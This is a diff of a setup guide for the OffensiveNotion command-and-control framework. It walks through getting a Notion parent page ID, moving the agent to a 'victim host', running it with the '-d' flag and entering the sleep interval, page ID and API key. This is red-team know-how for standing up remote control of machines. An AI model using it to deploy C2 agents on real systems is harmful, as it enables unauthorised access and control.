@@ -85,7 +85,7 @@ unset GOARCH
 
 ![image](https://user-images.githubusercontent.com/16122365/235882256-9bcede44-0195-4de9-a675-a07658f452cb.png)
 
-8. Grab the page ID of your Notion page by hitting the share button and copying the link into an editor of choice
+8. Grab the parent page ID of your Notion page by hitting the share button and copying the link into an editor of choice
 
 ![image](https://user-images.githubusercontent.com/16122365/235883290-086ad4f6-77d4-48e4-b485-e2aad1f72f06.png)
 
@@ -96,15 +96,33 @@ unset GOARCH
 
 # Testing the C2 Server
 
-Download the agent from the releases section of the Offensive Notion GitHub: https://github.com/mttaggart/OffensiveNotion/releases
+1. Download the agent from the releases section of the Offensive Notion GitHub: https://github.com/mttaggart/OffensiveNotion/releases. For the test we will use the Windows debug agent to keep things simple.
 
-Transfer the windows binary created initial and the key file to the test victim host. It's possible to hardcode these to the binary however as its bank holiday weekend and we are just demonstrating capability we will use the command line to specify our keys and credentials.
+![image](https://user-images.githubusercontent.com/16122365/235884546-d7ff729a-176b-4d7b-8a2f-c3f94e8fbba3.png)
 
-**IMAGE**
+2. Transfer the agent to the victim host
 
-Once run, you should see a new sub page created in your Notion page that is representative of the hostname of the victim device.
+![image](https://user-images.githubusercontent.com/16122365/235885306-c7423bc0-5e77-41b9-9343-69ba0b2f527a.png)
 
-**IMAGE**
+3. Run the agent with the -d parameter
+
+`./offensive_notion -d`
+
+5. Enter the following configuration parameters
+
+```
+[*] Starting!
+Getting config options!
+[*] Enter agent sleep interval > 5
+[*] Enter agent jitter time > 0
+[*] Enter parent page id > [insert page id - STEP 8 in previous section]
+[*] Enter API Key > [insert integration token secret - STEP 6 in previous section]
+[*] Enter Config File Path > [leave blank]
+[*] Enter Log Level (1-4) > 2
+```
+Once run, you should see a new sub page created in your Notion parent page that is representative of the hostname of the victim device.
+
+![image](https://user-images.githubusercontent.com/16122365/235887128-e0e15269-6208-4ada-9627-8f1cbab3a861.png)
 
 ## Example commands and output:
 
